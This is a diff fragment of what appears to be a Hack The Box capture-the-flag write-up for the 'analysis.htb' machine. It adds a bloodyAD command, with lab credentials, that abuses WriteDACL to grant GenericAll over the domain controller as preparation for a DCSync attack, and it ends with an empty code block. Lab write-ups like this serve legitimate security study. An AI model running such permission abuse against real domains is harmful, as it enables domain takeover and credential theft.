@@ -593,5 +593,14 @@ DACL: WRITE
 
 I have a lot of permissions on a lot of different objects, but the one highlighted above will allow me to perform a DCSync attack
 
+```python
+❯❯❯ bloodyAD --host dc-analysis.analysis.htb -d analysis.htb -u soc_analyst -p 'Password123!' add genericAll 'CN=DC-ANALYSIS,OU=DOMAIN CONTROLLERS,DC=ANALYSIS,DC=HTB' 'soc_analyst'
+[+] soc_analyst has now GenericAll on CN=DC-ANALYSIS,OU=DOMAIN CONTROLLERS,DC=ANALYSIS,DC=HTB
+```
 
+First ill abuse writedacl and add genericall over the domain controller
+
+```python
+
+```
 
